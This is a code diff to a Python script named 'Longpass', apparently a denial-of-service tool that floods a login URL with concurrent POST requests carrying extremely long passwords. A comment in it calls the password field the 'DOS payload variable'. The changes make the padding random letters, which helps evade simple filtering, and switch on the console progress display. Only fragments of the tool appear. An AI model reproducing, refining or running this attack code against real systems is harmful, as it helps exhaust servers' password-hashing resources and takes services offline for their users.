@@ -2,6 +2,8 @@ import sys
 import asyncio
 import aiohttp
 import time
+from random import choice
+from string import ascii_letters
 from termcolor import colored
 
 class Longpass:
@@ -28,10 +30,11 @@ class Longpass:
         self.updateUI(2, "Done!\n")
 
         # Set the POST payload
-        # @todo Add POST variables from the command line argument, ie. --variables username=john,email=user@domain.com
         # @todo Add an ability to set a custom variable name for the "password" DOS payload variable
         #self.payload = { 'username': self.username, 'password': password }
         self.payload['password'] = password
+        #self.updateUI(0, password) # debug
+        password = None
 
         # Add requests to the task list
         for i in range(self.repeats):
@@ -56,8 +59,7 @@ class Longpass:
 
     def generatePassword(self, size):
         # Generate password
-        # @todo Generate the password from random characters
-        return "x" * size
+        return "".join(choice(ascii_letters) for i in range(size))
 
     def clear(self):
         # Clear screen, return cursor to top left
@@ -72,7 +74,7 @@ class Longpass:
         except IndexError:
             self.ui.insert(position, txt)
 
-        #self.clear()
+        self.clear()
         for msg in self.ui:
             sys.stdout.write(msg + "\n")
 
@@ -122,6 +124,9 @@ class Longpass:
 
         # The actual request
         response = await aiohttp.post(self.url, data = self.payload)
+
+        # Response debug
+        #self.updateUI(50, await response.text())
 
         # Add to iteration counter
         self.progress(1)
